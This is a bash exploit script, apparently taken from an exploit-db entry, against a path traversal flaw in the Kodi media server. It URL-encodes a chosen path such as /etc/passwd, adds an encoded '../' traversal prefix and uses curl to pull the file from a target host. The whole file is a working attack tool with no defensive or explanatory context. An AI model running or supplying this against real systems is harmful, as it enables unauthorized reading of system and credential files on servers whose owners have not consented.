#!/bin/bash
#############################################################
# Kodi file fetch                                  ##########
# Author DarkerEgo                                 ########
# GPL 2015                                         #####
# https://www.exploit-db.com/exploits/38833/       ###
#####################################################

if [[ $1 == "" ]];then
  echo "USAGE: $0 host path <1.2.3.4> </etc/passwd>"
fi

host=$1
exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"

#//%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/%2fetc%2ffstab

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER) 
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}


lpath=$(rawurlencode "$2");echo $lpath
curl $1/$exploit/$lpath
